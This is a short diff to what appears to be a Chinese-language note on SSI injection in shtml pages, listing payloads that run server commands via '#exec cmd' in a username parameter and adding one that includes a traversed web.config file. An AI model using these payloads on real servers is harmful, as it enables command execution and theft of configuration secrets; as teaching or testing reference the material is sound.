@@ -4,4 +4,6 @@ shtml是一种特殊的html。需要运行在支持SSI的服务器，如apache�
 ?username=<!--#exec cmd="命令"-->
 
 ?username=<!--#exec cmd="ls"-->
+
+ssi:<--#include file="..\..\web.config" -->
 ```
